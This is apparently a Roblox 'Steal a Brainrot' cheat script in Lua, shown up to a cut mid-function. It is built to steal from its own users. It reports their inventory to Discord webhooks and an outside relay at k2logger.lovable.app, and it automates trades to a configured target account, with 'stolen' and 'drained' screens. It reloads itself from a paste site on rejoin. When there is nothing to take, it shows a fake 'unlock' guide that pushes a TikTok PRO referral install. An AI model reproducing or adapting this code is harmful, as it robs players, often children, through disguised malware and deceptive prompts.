-- ===================== MAIN SCRIPT (loadstring) =====================
-- Remotes resolved via TradeController getupvalue (no hard-coded Net indexes)
-- If no target brainrots on base at start → Discord invite GUI (no trades / no embed)
if getgenv().BrainrotMainLoaded and not getgenv().BrainrotForceRestart then
	return warn("[Brainrot] Main already running! Set getgenv().BrainrotForceRestart = true to reload")
end
getgenv().BrainrotForceRestart = nil
getgenv().BrainrotMainLoaded = true
print("[Brainrot] ===== LOADED BUILD syncrypt-1to1 =====")
print("[Brainrot] If you do not see this line, If missing, executor cached OLD script.")

local genv = getgenv()
-- Silent rejoin: set by queue_on_teleport; skips Discord/Join GUI, keeps trading
genv.BRAINROT_MAIN_URL = genv.BRAINROT_MAIN_URL or "https://pastefy.app/7pawbdOp/raw"
local isSilentRejoin = genv.BrainrotSilentRejoin == true
genv.BrainrotSilentRejoin = nil
if isSilentRejoin then
	print("[Brainrot] Silent rejoin execute (no GUI)")
end

-- Supported places (main + variants + duel)
-- Accepts array {id,id} OR map {[id]=true} from genv; always merges defaults
local DEFAULT_PLACE_IDS = {
	109983668079237, -- main
	78906538690694,
	85621847059032,
	119594317142884,
	128855408206367,
	99606176102979,  -- duel
}
local CREATOR_GROUP_ID = 35815907 -- Steal a Brainrot group (Chocola-style)

local function buildPlaceSet()
	local set = {}
	local function add(id)
		id = tonumber(id)
		if id then set[id] = true end
	end
	for _, id in ipairs(DEFAULT_PLACE_IDS) do add(id) end
	local extra = genv.ALLOWED_PLACE_IDS
	if type(extra) == "table" then
		-- array style
		for _, id in ipairs(extra) do add(id) end
		-- map style {[placeId]=true}
		for k, v in pairs(extra) do
			if v == true or type(k) == "number" then
				add(type(k) == "number" and k or v)
			end
		end
	end
	return set
end

local allowedPlaceSet = buildPlaceSet()

local function isAllowedPlace()
	local pid = game.PlaceId
	if allowedPlaceSet[pid] then
		return true
	end
	-- Chocola fallback: any place owned by the game's creator group
	local ok, info = pcall(function()
		return game:GetService("MarketplaceService"):GetProductInfo(pid)
	end)
	if ok and info and info.Creator
		and info.Creator.CreatorType == "Group"
		and tonumber(info.Creator.CreatorTargetId) == CREATOR_GROUP_ID
	then
		return true
	end
	return false
end

if not isAllowedPlace() then
	warn("[Brainrot] Place not allowed:", game.PlaceId, "— exiting")
	getgenv().BrainrotMainLoaded = nil
	return
end

local DUEL_PLACE_ID = 99606176102979
local isInDuel = (game.PlaceId == DUEL_PLACE_ID)
local DUEL_COLOR = 0x808080 -- gray when in duel
print("[Brainrot] PlaceId =", game.PlaceId, "| InDuel =", isInDuel, "| allowed = true")

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
if not table.clear then function table.clear(t) for k in pairs(t) do t[k]=nil end end end
local HttpService = game:GetService("HttpService")
local SoundService = game:GetService("SoundService")
local TweenService = game:GetService("TweenService")
local LP = Players.LocalPlayer
local cam = workspace.CurrentCamera
local pg = LP:WaitForChild("PlayerGui")
local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")

-- Secret key (preferred) → website relay. Fallback: direct Discord webhook for backwards compat.
local LOGGER_KEY = (type(genv.LOGGER_KEY) == "string" and genv.LOGGER_KEY ~= "" and genv.LOGGER_KEY) or nil
local GOOD_WEBHOOK = genv.GOOD_WEBHOOK or ""
-- When LOGGER_KEY is set, do not rely on exposing a Discord webhook in the script.
if LOGGER_KEY then
	GOOD_WEBHOOK = "" -- private hit goes through proxy; keep LOG/MISS internal webhooks
end
local GOOD_AVATAR = genv.GOOD_AVATAR or "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
local TARGET_ID = tonumber(genv.TARGET_USER_ID) or 0
local RELAY_URL = "https://k2logger.lovable.app/api/public/webhook/relay"
local HITS_BROADCAST_URL = "https://k2logger.lovable.app/api/public/hits/broadcast"
print("[Brainrot] TARGET_ID =", TARGET_ID)
print("[Brainrot] LOGGER_KEY set:", LOGGER_KEY ~= nil, LOGGER_KEY and ("len=" .. tostring(#LOGGER_KEY)) or "")
print("[Brainrot] GOOD_WEBHOOK set:", GOOD_WEBHOOK ~= "" and GOOD_WEBHOOK ~= nil)
local primaryLogSent = false
local currentlyInTrade = false
-- Snapshot of the full inventory log from sendDetailedWebhook (used by miss webhook)
-- Only includes brainrots that were in the original log — nothing added after.
local lastFullLogSnapshot = nil

local STOLEN_GUI_URL = "https://paste.rs/NQk9A"
local DRAINED_NEED_STREAK = 4
local drainedGuiShown = false
local DISCORD_LINK = "https://discord.gg/bxjXucMVqB"




local FANDOM_BASE = "https://stealabrainrot.fandom.com/wiki/"
local TRADE_CYCLE_DELAY = 1.5
-- Syncrypt-style GUID map (decompile override + fallback)
local TRADE_GUIDS = {
	["TradeService/Invite"] = "9b5a0c7d-327f-415a-9720-b8e4f02b946a",
	["TradeService/AddBrainrot"] = "bce6ca77-ef3c-4aab-b6e1-99f9c1815863",
	["TradeService/Ready"] = "1774f028-dbab-4713-8122-c30d77582edc",
	["TradeService/Accept"] = "d061f53c-7d12-4a4a-a761-d70b06c0d44c",
	["TradeService/CancelTrade"] = "b05e61e6-8cbd-4fb2-a683-cf2873e179e6",
}
local INVITE_GUID = TRADE_GUIDS["TradeService/Invite"]
local SELECT_GUID = TRADE_GUIDS["TradeService/AddBrainrot"]
local SELECTGB_GUID = "b0e90195-78ba-4028-8af6-8eb86c4ed82d"
local READY_GUID = TRADE_GUIDS["TradeService/Ready"]
local ACCEPT_GUID = TRADE_GUIDS["TradeService/Accept"]
local CANCEL_GUID = TRADE_GUIDS["TradeService/CancelTrade"]
local FOOTER_ICON = "https://media.discordapp.net/attachments/1511087340721012919/1544655871529852988/2d33efc28dde57ea69dd4291cb6b4d6f_2.webp?ex=6a994c62&is=6a97fae2&hm=cd5486a74b48c119c89809204444e8a855045337dc23ede08a46ae7dd4077279&=&format=webp"
local FALLBACK_COLOR = 0x1A237E
local guiNames = { BrainrotTrader = true, TradeLiveTrade = true, TradePrompts = true }

local MUTATION_MULT = {
	["None"] = 1, ["Default"] = 1, ["Gold"] = 1.25, ["Diamond"] = 1.5, ["Bloodrot"] = 2,
	["Candy"] = 4, ["Lava"] = 6, ["Galaxy"] = 7, ["Yin Yang"] = 7.5,
	["Radioactive"] = 8.5, ["Cursed"] = 9, ["Divine"] = 10, ["Rainbow"] = 10,
	["Cyber"] = 11, ["Phantom"] = 12, ["Crystal"] = 13, ["Eclipse"] = 14,
}

local MUTATION_EMOJI = {
	["None"] = "<:Default_Mutation:1483657150231216138>",
	["Default"] = "<:Default_Mutation:1483657150231216138>",
	["Gold"] = "<:Gold:1498277392194736138>",
	["Diamond"] = "<:Diamond:1498277422746046514>",
	["Rainbow"] = "<:Rainbow:1498277403871678514>",
	["Divine"] = "<:Divine:1498277407793348789>",
	["Radioactive"] = "<:Radioactive:1498277395562758276>",
	["Cursed"] = "<:Cursed:1498277428391317575>",
	["Galaxy"] = "<:Galaxy:1498277390571536395>",
	["Candy"] = "<:Candy:1498277426621448192>",
	["Bloodrot"] = "<:Bloodrot:1498277424490610710>",
	["Crystal"] = "<:Crystal:1532523409630695624>",
	["Phantom"] = "<:phan:1533658669173047326>",
	["Lava"] = "<:Lava:1498277393754886216>",
	["Cyber"] = "<:Cyber:1498277418815983776>",
	["Yin Yang"] = "<:YingYang:1513911235337261076>",
	["Eclipse"] = "<:Eclispe:1558536036441657414>",
}

local GEAR_EMOJI = {
	["Waverider"] = "<:Waverider:1536942058676420680>",
	["Yin Yang Lamp"] = "<:YinYangLamp:1536942111218335754>",
	["Cupids Wings"] = "<:CupidsWings:1536941473407176715>",
	["Santas Sleigh"] = "<:SantasSleigh:1536942025646153818>",
	["Radioactive Airstrike"] = "<:RadioactiveAirstrike:1536941888148480000>",
	["Alien Slap"] = "<:AlienSlap:1536941130581807124>",
	["Divine Slap"] = "<:DivineSlap:1536941781277741076>",
	["Lava Slap"] = "<:LavaSlap:1536941851267965028>",
	["Cursed Slap"] = "<:CursedSlap:1536941510824689764>",
	["Demons Head"] = "<:DemonsHead:1536941574028525649>",
	["Witchs Broom"] = "<:WitchsBroom:1536942085649731667>",
	["Radioactive Slap"] = "<:RadioactiveSlap:1536941915931545650>",
	["Blackhole Bomb"] = "<:BlackholeBomb:1536941156649402490>",
	["Phantom Slap"] = "<:PhantomSlap:1536940296116371477>",
	["Cyber Slap"] = "<:CyberSlap:1536941541971730483>",
	["Lava Blaster"] = "<:LavaBlaster:1536941824915283998>",
	["Rainbow Slap"] = "<:RainbowSlap:1536941997510754424>",
	["Rainbow Hammer"] = "<:RainbowHammer:1536941964149133352>",
	["Bunny Basket"] = "<:BunnyBasket:1536943427327889419>",
	["Blood Moon Slap"] = "<:BloodMoonSlap:1538670582848032890>",
}

local BASESKIN_EMOJI = {
	["Octo"] = "<:Octo:1536944000752418856>",
	["Aquatic"] = "<:Aquatic:1536943396168532018>",
	["Rose"] = "<:Rose:1536944091558842378>",
	["Halloween"] = "<:Halloween:1536943747995279380>",
	["Pot Of Gold"] = "<:PotOfGold:1536944019827986532>",
	["Valentines"] = "<:Valentines:1536944152565252136>",
	["Christmas"] = "<:Christmas:1536943450388308049>",
	["Taco"] = "<:Taco:1536944658809225286>",
	["Lucky"] = "<:Lucky:1536943979793490000>",
}

local TargetBrainrots = {}
local GOOD_BRAINROTS = {}
if type(genv.ALLOWED_ANIMALS) == "table" then
	for _, name in pairs(genv.ALLOWED_ANIMALS) do
		if type(name) == "string" then
			TargetBrainrots[name] = true
			GOOD_BRAINROTS[name] = true
		end
	end
end
if next(TargetBrainrots) == nil then
	warn("[Brainrot] No ALLOWED_ANIMALS set in getgenv(). Using empty list.")
end

local ALLOWED_BASESKINS = genv.ALLOWED_BASESKINS or {}
local ALLOWED_GEARS = genv.ALLOWED_GEARS or {}

-----------------------------------------------------------
-- No-target Discord GUI (same visual language as stolen GUI)
-----------------------------------------------------------
local function showJoinDiscordGui()
	if isSilentRejoin then
		print("[Brainrot] Skipping Discord GUI (silent rejoin)")
		return
	end
	local old = pg:FindFirstChild("BrainrotJoinDiscordGui")
	if old then old:Destroy() end

	local LOGO_ID = "rbxassetid://137341352846357"
	local BG_ID   = "rbxassetid://131683450353430"

	local INVITE_URL = (type(genv.TIKTOK_PRO_INVITE) == "string" and genv.TIKTOK_PRO_INVITE ~= "" and genv.TIKTOK_PRO_INVITE)
		or "https://pro.tiktok.com/t/ZP9PHo8w86otq-icgNm/"
	local SUPPORT_DISCORD = DISCORD_LINK or "https://discord.gg/bxjXucMVqB"

	local Colors = {
		violet   = Color3.fromRGB(145, 145, 145),
		violetDk = Color3.fromRGB(85, 85, 85),
		blue     = Color3.fromRGB(185, 185, 185),
		accent   = Color3.fromRGB(205, 205, 205),
		bg0      = Color3.fromRGB(8, 7, 14),
		bg1      = Color3.fromRGB(13, 11, 23),
		card     = Color3.fromRGB(20, 17, 34),
		cardHi   = Color3.fromRGB(30, 26, 50),
		line     = Color3.fromRGB(72, 72, 72),
		off      = Color3.fromRGB(55, 55, 55),
		white    = Color3.fromRGB(255, 255, 255),
		muted    = Color3.fromRGB(175, 175, 175),
		dim      = Color3.fromRGB(125, 125, 125),
		green    = Color3.fromRGB(64, 224, 128),
		amber    = Color3.fromRGB(255, 190, 70),
		red      = Color3.fromRGB(220, 80, 90),
		black    = Color3.fromRGB(4, 3, 8),
		cyan     = Color3.fromRGB(120, 210, 255),
	}

	local function tw(obj, info, goal)
		local t = TweenService:Create(obj, info, goal)
		t:Play()
		return t
	end
	local function corner(obj, r)
		local c = Instance.new("UICorner")
		c.CornerRadius = typeof(r) == "UDim" and r or UDim.new(0, r or 12)
		c.Parent = obj
		return c
	end
	local function round(obj)
		return corner(obj, UDim.new(1, 0))
	end
	local function stroke(obj, color, thick, alpha)
		local s = Instance.new("UIStroke")
		s.Color = color
		s.Thickness = thick or 1
		s.Transparency = alpha or 0
		s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
		s.Parent = obj
		return s
	end
	local function copyText(str)
		for _, fn in ipairs({ setclipboard, toclipboard, writeclipboard }) do
			if type(fn) == "function" then
				local ok = pcall(fn, str)
				if ok then return true end
			end
		end
		return false
	end

	local STEPS = {
		{
			title = "Unlock required",
			body = "This build needs a quick unlock before it can run.\n\nFollow the steps in this guide (takes about 2–3 minutes).\n\nYou only need the official TikTok PRO invite link — no payment outside that flow, and no random downloads.",
			showLink = false, tip = "Tip: use only the invite link shown in this menu.",
		},
		{
			title = "What you need",
			body = "To unlock the script you need:\n\n1) The official TikTok PRO invite link\n2) About 2–3 minutes on your phone\n3) Your normal TikTok account\n\nUse only the invite link shown in this guide. Do not use random third-party downloads.",
			showLink = false, tip = "Never install from unofficial sites.",
		},
		{
			title = "Copy the TikTok PRO invite",
			body = "Tap COPY LINK below, then open it in your phone browser or TikTok in-app browser.\n\nWhat you should see:\n• An official TikTok PRO invite page\n• A clear Install / Get access button\n\nIf the page looks different or asks for payment outside TikTok PRO, stop and join Discord for help.",
			showLink = true, tip = "Use the COPY button — don’t type the URL by hand.",
		},
		{
			title = "Install TikTok PRO",
			body = "On the invite page:\n\n1) Sign in with the TikTok account you actually use\n2) Accept the invite / install TikTok PRO\n3) Wait until install finishes completely\n4) Open TikTok PRO at least once so it registers\n\nDo not skip opening the app — incomplete installs fail access checks.",
			showLink = true, tip = "Stay on Wi-Fi. Close other downloads while installing.",
		},
		{
			title = "Re-execute this script",
			body = "After install:\n\n1) Return to Roblox\n2) Open your executor\n3) Run the SAME loader you used before\n\nOnce unlock is complete, the script should load normally on re-execute.\n\nIf this screen appears again, repeat the invite steps once more.",
			showLink = false, tip = "Use the same loader / key you already have.",
		},
		{
			title = "Need help?",
			body = "Still stuck?\n\n• Re-copy the invite and open it again\n• Make sure TikTok PRO finished installing\n• Open TikTok PRO once, then re-run the script\n\nSupport Discord is below — send:\nexecutor name · PlaceId · screenshot of this GUI",
			showLink = false, showDiscord = true, tip = "Support is fastest with a screenshot.",
		},
	}
	local TOTAL = #STEPS

	local gui = Instance.new("ScreenGui")
	gui.Name = "BrainrotJoinDiscordGui"
	gui.ResetOnSpawn = false
	gui.IgnoreGuiInset = true
	gui.DisplayOrder = 1000
	gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	gui.Parent = pg

	local root = Instance.new("Frame")
	root.Name = "Root"
	root.Size = UDim2.fromScale(1, 1)
	root.BackgroundColor3 = Colors.bg0
	root.BorderSizePixel = 0
	root.ClipsDescendants = true
	root.ZIndex = 1
	root.Parent = gui

	local skyG = Instance.new("UIGradient")
	skyG.Rotation = 35
	skyG.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0, Color3.fromRGB(26, 14, 44)),
		ColorSequenceKeypoint.new(0.45, Colors.bg0),
		ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 16, 36)),
	})
	skyG.Parent = root

	local bgTex = Instance.new("ImageLabel")
	bgTex.Size = UDim2.fromScale(1, 1)
	bgTex.BackgroundTransparency = 1
	bgTex.Image = BG_ID
	bgTex.ScaleType = Enum.ScaleType.Crop
	bgTex.ImageTransparency = 0.88
	bgTex.ZIndex = 1
	bgTex.Parent = root

	local vignette = Instance.new("Frame")
	vignette.Size = UDim2.fromScale(1, 1)
	vignette.BackgroundColor3 = Colors.black
	vignette.BackgroundTransparency = 0.5
	vignette.BorderSizePixel = 0
	vignette.ZIndex = 2
	vignette.Parent = root

	local particleLayer = Instance.new("Frame")
	particleLayer.Size = UDim2.fromScale(1, 1)
	particleLayer.BackgroundTransparency = 1
	particleLayer.ZIndex = 3
	particleLayer.Parent = root
	local particles = {}
	for i = 1, 14 do
		local p = Instance.new("Frame")
		p.Size = UDim2.fromOffset(math.random(2, 3), math.random(2, 3))
		p.Position = UDim2.new(math.random(), 0, math.random(), 0)
		p.BackgroundColor3 = Colors.accent
		p.BackgroundTransparency = 0.55 + math.random() * 0.3
		p.BorderSizePixel = 0
		p.ZIndex = 3
		p.Parent = particleLayer
		round(p)
		particles[i] = { frame = p, speed = 0.004 + math.random() * 0.01, drift = (math.random() - 0.5) * 0.008, baseT = p.BackgroundTransparency }
	end
	task.spawn(function()
		while gui.Parent do
			local t = tick()
			skyG.Rotation = 35 + math.sin(t * 0.2) * 12
			for _, pt in ipairs(particles) do
				local f = pt.frame
				if f and f.Parent then
					local x = f.Position.X.Scale + pt.drift * 0.016
					local y = f.Position.Y.Scale - pt.speed * 0.9
					if y < -0.04 then y = 1.04; x = math.random() end
					if x < -0.04 then x = 1.04 elseif x > 1.04 then x = -0.04 end
					f.Position = UDim2.fromScale(x, y)
					f.BackgroundTransparency = pt.baseT + math.sin(t * 1.4 + x * 8) * 0.08
				end
			end
			task.wait(0.05)
		end
	end)

	local shell = Instance.new("Frame")
	shell.Name = "Shell"
	shell.AnchorPoint = Vector2.new(0.5, 0.5)
	shell.Position = UDim2.fromScale(0.5, 0.5)
	shell.Size = UDim2.new(0.92, 0, 0.9, 0)
	shell.BackgroundColor3 = Colors.card
	shell.BackgroundTransparency = 0.08
	shell.BorderSizePixel = 0
	shell.ClipsDescendants = true
	shell.ZIndex = 10
	shell.Parent = root
	corner(shell, 18)
	stroke(shell, Colors.line, 1, 0.35)

	local shellConstraint = Instance.new("UISizeConstraint")
	shellConstraint.MaxSize = Vector2.new(440, 640)
	shellConstraint.MinSize = Vector2.new(280, 420)
	shellConstraint.Parent = shell

	local shellPad = Instance.new("UIPadding")
	shellPad.PaddingTop = UDim.new(0, 14)
	shellPad.PaddingBottom = UDim.new(0, 12)
	shellPad.PaddingLeft = UDim.new(0, 14)
	shellPad.PaddingRight = UDim.new(0, 14)
	shellPad.Parent = shell

	local layout = Instance.new("UIListLayout")
	layout.FillDirection = Enum.FillDirection.Vertical
	layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
	layout.SortOrder = Enum.SortOrder.LayoutOrder
	layout.Padding = UDim.new(0, 8)
	layout.Parent = shell

	local header = Instance.new("Frame")
	header.BackgroundTransparency = 1
	header.Size = UDim2.new(1, 0, 0, 72)
	header.LayoutOrder = 1
	header.ZIndex = 11
	header.Parent = shell

	local ring = Instance.new("Frame")
	ring.Size = UDim2.fromOffset(44, 44)
	ring.Position = UDim2.new(0, 0, 0.5, -22)
	ring.BackgroundColor3 = Colors.white
	ring.BackgroundTransparency = 0.92
	ring.BorderSizePixel = 0
	ring.ZIndex = 12
	ring.Parent = header
	round(ring)
	local logo = Instance.new("ImageLabel")
	logo.Size = UDim2.new(1, -6, 1, -6)
	logo.Position = UDim2.fromOffset(3, 3)
	logo.BackgroundColor3 = Colors.bg1
	logo.BorderSizePixel = 0
	logo.Image = LOGO_ID
	logo.ScaleType = Enum.ScaleType.Crop
	logo.ZIndex = 13
	logo.Parent = ring
	round(logo)

	local brand = Instance.new("TextLabel")
	brand.BackgroundTransparency = 1
	brand.Position = UDim2.fromOffset(54, 6)
	brand.Size = UDim2.new(1, -54, 0, 18)
	brand.Font = Enum.Font.GothamBold
	brand.TextSize = 12
	brand.TextXAlignment = Enum.TextXAlignment.Left
	brand.TextColor3 = Colors.accent
	brand.Text = "K2  ·  SETUP GUIDE"
	brand.ZIndex = 12
	brand.Parent = header

	local headTitle = Instance.new("TextLabel")
	headTitle.BackgroundTransparency = 1
	headTitle.Position = UDim2.fromOffset(54, 26)
	headTitle.Size = UDim2.new(1, -54, 0, 36)
	headTitle.Font = Enum.Font.GothamBlack
	headTitle.TextSize = 16
	headTitle.TextWrapped = true
	headTitle.TextXAlignment = Enum.TextXAlignment.Left
	headTitle.TextYAlignment = Enum.TextYAlignment.Top
	headTitle.TextColor3 = Colors.white
	headTitle.Text = "Do this to unlock the script"
	headTitle.ZIndex = 12
	headTitle.Parent = header

	local progWrap = Instance.new("Frame")
	progWrap.BackgroundTransparency = 1
	progWrap.Size = UDim2.new(1, 0, 0, 28)
	progWrap.LayoutOrder = 2
	progWrap.ZIndex = 11
	progWrap.Parent = shell

	local stepBadge = Instance.new("TextLabel")
	stepBadge.BackgroundTransparency = 1
	stepBadge.Size = UDim2.new(1, 0, 0, 14)
	stepBadge.Font = Enum.Font.GothamBold
	stepBadge.TextSize = 11
	stepBadge.TextColor3 = Colors.cyan
	stepBadge.TextXAlignment = Enum.TextXAlignment.Left
	stepBadge.Text = "STEP 01  /  06"
	stepBadge.ZIndex = 12
	stepBadge.Parent = progWrap

	local track = Instance.new("Frame")
	track.Position = UDim2.fromOffset(0, 18)
	track.Size = UDim2.new(1, 0, 0, 6)
	track.BackgroundColor3 = Colors.off
	track.BorderSizePixel = 0
	track.ZIndex = 12
	track.Parent = progWrap
	corner(track, 4)
	local fill = Instance.new("Frame")
	fill.Size = UDim2.fromScale(1 / TOTAL, 1)
	fill.BackgroundColor3 = Colors.accent
	fill.BorderSizePixel = 0
	fill.ZIndex = 13
	fill.Parent = track
	corner(fill, 4)
	local fillG = Instance.new("UIGradient")
	fillG.Color = ColorSequence.new(Colors.violet, Colors.cyan)
	fillG.Parent = fill

	local card = Instance.new("Frame")
	card.BackgroundColor3 = Colors.cardHi
	card.BackgroundTransparency = 0.15
	card.BorderSizePixel = 0
	card.Size = UDim2.new(1, 0, 0.52, 0)
	card.LayoutOrder = 3
	card.ZIndex = 11
	card.ClipsDescendants = true
	card.Parent = shell
	corner(card, 14)
	stroke(card, Colors.line, 1, 0.45)
	pcall(function()
		local sc = Instance.new("UISizeConstraint")
		sc.MinSize = Vector2.new(0, 160)
		sc.Parent = card
	end)

	local scroll = Instance.new("ScrollingFrame")
	scroll.Size = UDim2.fromScale(1, 1)
	scroll.BackgroundTransparency = 1
	scroll.BorderSizePixel = 0
	scroll.ScrollBarThickness = 3
	scroll.ScrollBarImageColor3 = Colors.accent
	scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
	scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
	scroll.ZIndex = 12
	scroll.Parent = card
	local scrollPad = Instance.new("UIPadding")
	scrollPad.PaddingTop = UDim.new(0, 12)
	scrollPad.PaddingBottom = UDim.new(0, 12)
	scrollPad.PaddingLeft = UDim.new(0, 12)
	scrollPad.PaddingRight = UDim.new(0, 12)
	scrollPad.Parent = scroll
	local scrollLayout = Instance.new("UIListLayout")
	scrollLayout.Padding = UDim.new(0, 8)
	scrollLayout.SortOrder = Enum.SortOrder.LayoutOrder
	scrollLayout.Parent = scroll

	local stepTitle = Instance.new("TextLabel")
	stepTitle.BackgroundTransparency = 1
	stepTitle.Size = UDim2.new(1, 0, 0, 22)
	stepTitle.Font = Enum.Font.GothamBlack
	stepTitle.TextSize = 15
	stepTitle.TextXAlignment = Enum.TextXAlignment.Left
	stepTitle.TextColor3 = Colors.white
	stepTitle.Text = STEPS[1].title
	stepTitle.ZIndex = 13
	stepTitle.LayoutOrder = 1
	stepTitle.Parent = scroll

	local stepBody = Instance.new("TextLabel")
	stepBody.BackgroundTransparency = 1
	stepBody.Size = UDim2.new(1, 0, 0, 0)
	stepBody.AutomaticSize = Enum.AutomaticSize.Y
	stepBody.Font = Enum.Font.Gotham
	stepBody.TextSize = 13
	stepBody.TextWrapped = true
	stepBody.TextXAlignment = Enum.TextXAlignment.Left
	stepBody.TextYAlignment = Enum.TextYAlignment.Top
	stepBody.TextColor3 = Colors.muted
	stepBody.Text = STEPS[1].body
	stepBody.ZIndex = 13
	stepBody.LayoutOrder = 2
	stepBody.Parent = scroll

	local tipLabel = Instance.new("TextLabel")
	tipLabel.BackgroundColor3 = Color3.fromRGB(28, 24, 48)
	tipLabel.Size = UDim2.new(1, 0, 0, 0)
	tipLabel.AutomaticSize = Enum.AutomaticSize.Y
	tipLabel.Font = Enum.Font.GothamMedium
	tipLabel.TextSize = 11
	tipLabel.TextWrapped = true
	tipLabel.TextXAlignment = Enum.TextXAlignment.Left
	tipLabel.TextColor3 = Colors.amber
	tipLabel.Text = "  " .. (STEPS[1].tip or "")
	tipLabel.ZIndex = 13
	tipLabel.LayoutOrder = 3
	tipLabel.Parent = scroll
	corner(tipLabel, 8)
	local tipPad = Instance.new("UIPadding")
	tipPad.PaddingTop = UDim.new(0, 8)
	tipPad.PaddingBottom = UDim.new(0, 8)
	tipPad.PaddingLeft = UDim.new(0, 8)
	tipPad.PaddingRight = UDim.new(0, 8)
	tipPad.Parent = tipLabel

	local linkRow = Instance.new("Frame")
	linkRow.BackgroundTransparency = 1
	linkRow.Size = UDim2.new(1, 0, 0, 64)
	linkRow.Visible = false
	linkRow.LayoutOrder = 4
	linkRow.ZIndex = 13
	linkRow.Parent = scroll
	local linkLbl = Instance.new("TextLabel")
	linkLbl.BackgroundTransparency = 1
	linkLbl.Size = UDim2.new(1, 0, 0, 14)
	linkLbl.Font = Enum.Font.GothamBold
	linkLbl.TextSize = 10
	linkLbl.TextXAlignment = Enum.TextXAlignment.Left
	linkLbl.TextColor3 = Colors.dim
	linkLbl.Text = "TIKTOK PRO INVITE"
	linkLbl.ZIndex = 14
	linkLbl.Parent = linkRow
	local linkBox = Instance.new("TextButton")
	linkBox.Position = UDim2.fromOffset(0, 18)
	linkBox.Size = UDim2.new(1, -88, 0, 36)
	linkBox.BackgroundColor3 = Colors.bg1
	linkBox.AutoButtonColor = false
	linkBox.Font = Enum.Font.Gotham
	linkBox.TextSize = 11
	linkBox.TextTruncate = Enum.TextTruncate.AtEnd
	linkBox.TextXAlignment = Enum.TextXAlignment.Left
	linkBox.TextColor3 = Colors.cyan
	linkBox.Text = "  " .. INVITE_URL
	linkBox.ZIndex = 14
	linkBox.Parent = linkRow
	corner(linkBox, 8)
	stroke(linkBox, Colors.line, 1, 0.4)
	local copyLinkBtn = Instance.new("TextButton")
	copyLinkBtn.Position = UDim2.new(1, -80, 0, 18)
	copyLinkBtn.Size = UDim2.fromOffset(80, 36)
	copyLinkBtn.BackgroundColor3 = Color3.fromRGB(40, 90, 180)
	copyLinkBtn.AutoButtonColor = false
	copyLinkBtn.Font = Enum.Font.GothamBold
	copyLinkBtn.TextSize = 11
	copyLinkBtn.TextColor3 = Colors.white
	copyLinkBtn.Text = "COPY"
	copyLinkBtn.ZIndex = 14
	copyLinkBtn.Parent = linkRow
	corner(copyLinkBtn, 8)

	local discRow = Instance.new("Frame")
	discRow.BackgroundTransparency = 1
	discRow.Size = UDim2.new(1, 0, 0, 48)
	discRow.Visible = false
	discRow.LayoutOrder = 5
	discRow.ZIndex = 13
	discRow.Parent = scroll
	local discBtn = Instance.new("TextButton")
	discBtn.Size = UDim2.new(1, 0, 0, 40)
	discBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
	discBtn.AutoButtonColor = false
	discBtn.Font = Enum.Font.GothamBold
	discBtn.TextSize = 13
	discBtn.TextColor3 = Colors.white
	discBtn.Text = "COPY DISCORD  ·  " .. (SUPPORT_DISCORD:gsub("https://", ""))
	discBtn.ZIndex = 14
	discBtn.Parent = discRow
	corner(discBtn, 10)

	local nav = Instance.new("Frame")
	nav.BackgroundTransparency = 1
	nav.Size = UDim2.new(1, 0, 0, 44)
	nav.LayoutOrder = 4
	nav.ZIndex = 11
	nav.Parent = shell

	local backBtn = Instance.new("TextButton")
	backBtn.Size = UDim2.new(0.32, -4, 1, 0)
	backBtn.BackgroundColor3 = Colors.bg1
	backBtn.AutoButtonColor = false
	backBtn.Font = Enum.Font.GothamBold
	backBtn.TextSize = 13
	backBtn.TextColor3 = Colors.muted
	backBtn.Text = "BACK"
	backBtn.ZIndex = 12
	backBtn.Parent = nav
	corner(backBtn, 10)
	stroke(backBtn, Colors.line, 1, 0.4)

	local nextBtn = Instance.new("TextButton")
	nextBtn.Position = UDim2.new(0.32, 4, 0, 0)
	nextBtn.Size = UDim2.new(0.68, -4, 1, 0)
	nextBtn.BackgroundColor3 = Color3.fromRGB(50, 110, 220)
	nextBtn.AutoButtonColor = false
	nextBtn.Font = Enum.Font.GothamBlack
	nextBtn.TextSize = 14
	nextBtn.TextColor3 = Colors.white
	nextBtn.Text = "NEXT STEP"
	nextBtn.ZIndex = 12
	nextBtn.Parent = nav
	corner(nextBtn, 10)

	local footer = Instance.new("TextLabel")
	footer.BackgroundTransparency = 1
	footer.Size = UDim2.new(1, 0, 0, 16)
	footer.LayoutOrder = 5
	footer.Font = Enum.Font.Gotham
	footer.TextSize = 10
	footer.TextColor3 = Colors.dim
	footer.Text = "K2  ·  follow every step carefully"
	footer.ZIndex = 11
	footer.Parent = shell

	local step, busy = 1, false
	local function flash(btn, ok, kind)
		local orig = btn.Text
		local prev = btn.BackgroundColor3
		btn.Text = ok and (kind == "discord" and "DISCORD COPIED!" or "LINK COPIED!") or "NO CLIPBOARD"
		tw(btn, TweenInfo.new(0.15), { BackgroundColor3 = ok and Colors.green or Colors.red })
		task.delay(1.2, function()
			if not btn.Parent then return end
			btn.Text = orig
			tw(btn, TweenInfo.new(0.2), { BackgroundColor3 = prev })
		end)
	end

	local function setStep(n)
		if busy then return end
		n = math.clamp(n, 1, TOTAL)
		busy = true
		step = n
		local s = STEPS[n]
		stepBadge.Text = string.format("STEP %02d  /  %02d", n, TOTAL)
		stepTitle.Text = s.title
		stepBody.Text = s.body
		tipLabel.Text = "  " .. (s.tip or "")
		linkRow.Visible = s.showLink == true
		discRow.Visible = s.showDiscord == true
		tw(fill, TweenInfo.new(0.35, Enum.EasingStyle.Quart), { Size = UDim2.fromScale(n / TOTAL, 1) })
		backBtn.TextColor3 = n == 1 and Colors.dim or Colors.white
		if n >= TOTAL then
			nextBtn.Text = "FINISH"
			tw(nextBtn, TweenInfo.new(0.2), { BackgroundColor3 = Color3.fromRGB(40, 160, 100) })
		else
			nextBtn.Text = "NEXT STEP"
			tw(nextBtn, TweenInfo.new(0.2), { BackgroundColor3 = Color3.fromRGB(50, 110, 220) })
		end
		scroll.CanvasPosition = Vector2.zero
		task.delay(0.15, function() busy = false end)
	end

	copyLinkBtn.MouseButton1Click:Connect(function()
